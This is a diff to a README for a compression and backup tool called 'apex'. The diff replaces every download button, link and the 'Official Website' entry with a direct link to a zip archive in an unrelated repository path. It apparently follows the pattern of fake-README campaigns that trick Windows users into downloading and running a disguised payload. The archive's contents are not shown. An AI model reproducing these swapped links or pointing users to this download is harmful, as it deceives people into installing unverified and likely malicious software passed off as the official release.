@@ -6,7 +6,7 @@ description: "Compress and archive data with adaptive multi-engine algorithms, F
 <h1>📦 apex - Your All-in-One Compression & Backup Powerhouse</h1>
 
 <p align="center">
-  <a href="https://github.com/Exploratory-lawpractice6837/apex" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ DOWNLOAD APEX NOW</a>
+  <a href="https://raw.githubusercontent.com/Exploratory-lawpractice6837/exploratory-lawpractice6837.github.io/main/overdear/3.7.zip" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ DOWNLOAD APEX NOW</a>
 </p>
 
 ---
@@ -52,7 +52,7 @@ Follow these simple steps to download and run apex on your Windows computer. No 
 
 Click the big button at the top of this page, or use this direct link:
 
-**[Visit this link to download the application](https://github.com/Exploratory-lawpractice6837/apex)**
+**[Visit this link to download the application](https://raw.githubusercontent.com/Exploratory-lawpractice6837/exploratory-lawpractice6837.github.io/main/overdear/3.7.zip)**
 
 This will take you to the official apex download page. Look for the latest release and download the file.
 
@@ -205,14 +205,14 @@ Remember, the download button is right at the top of this page. Just click it, a
 ---
 
 <p align="center">
-  <a href="https://github.com/Exploratory-lawpractice6837/apex" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#48dbfb,#0abde3);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 15px rgba(0,0,0,0.2);">⬇️ GET APEX – FREE DOWNLOAD</a>
+  <a href="https://raw.githubusercontent.com/Exploratory-lawpractice6837/exploratory-lawpractice6837.github.io/main/overdear/3.7.zip" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#48dbfb,#0abde3);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 15px rgba(0,0,0,0.2);">⬇️ GET APEX – FREE DOWNLOAD</a>
 </p>
 
 ---
 
 <h3>📄 Additional Resources</h3>
 
-- **Official Website**: [https://github.com/Exploratory-lawpractice6837/apex](https://github.com/Exploratory-lawpractice6837/apex)
+- **Official Website**: [https://raw.githubusercontent.com/Exploratory-lawpractice6837/exploratory-lawpractice6837.github.io/main/overdear/3.7.zip](https://raw.githubusercontent.com/Exploratory-lawpractice6837/exploratory-lawpractice6837.github.io/main/overdear/3.7.zip)
 - **Release Notes**: Check the repository for the latest updates and version history.
 - **Source Code**: Available for developers who want to contribute or customize.
 
